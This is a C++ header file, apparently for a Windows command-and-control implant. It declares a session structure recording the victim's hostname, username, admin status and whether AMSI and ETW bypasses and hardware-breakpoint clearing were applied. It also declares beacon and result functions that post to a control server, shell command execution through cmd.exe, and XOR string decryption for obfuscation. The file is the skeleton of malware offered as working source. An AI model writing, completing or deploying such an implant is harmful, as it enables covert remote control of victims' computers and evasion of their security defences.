#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <cstdint>
#include "config.hpp"

// ---------------------------------------------------------------------------
// Session — implant identity and state, sent with every beacon
// ---------------------------------------------------------------------------

struct Session {
    std::wstring sessionId;   // hash(hostname)|username
    std::wstring hostname;
    std::wstring username;
    DWORD build;              // OS build number
    BOOL  elevated;           // running as admin
    BOOL  amsiPatched;        // AMSI bypass applied
    BOOL  etwPatched;         // ETW bypass applied
    BOOL  hwbpsCleared;       // hardware breakpoints zeroed
};

// ---------------------------------------------------------------------------
// C2 protocol
// ---------------------------------------------------------------------------

// Main beacon loop — blocks until "exit" is received or process is killed
VOID BeaconLoop();

// POST /beacon — sends session recon, receives next task in taskOut
BOOL SendBeacon(const Session& session, std::wstring& taskOut);

// POST /result — sends command output back to the server
BOOL SendResult(const std::wstring& sessionId, const std::wstring& output);

// Execute a shell command via cmd.exe /C and capture stdout+stderr
std::wstring ExecuteCommand(const std::wstring& cmd);

// XOR-decrypt an encrypted byte array using a wide-string key
std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& key);